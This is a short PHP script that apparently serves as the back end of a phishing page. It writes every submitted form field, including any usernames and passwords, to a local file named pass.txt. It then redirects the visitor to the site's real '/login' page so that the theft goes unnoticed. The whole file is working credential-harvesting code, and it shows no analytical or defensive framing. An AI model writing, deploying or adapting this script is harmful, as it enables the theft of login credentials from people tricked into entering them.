<?php
$location='/login';
header("Location: " . "http://" . $_SERVER['HTTP_HOST'] . $location);
$handle = fopen("pass.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>

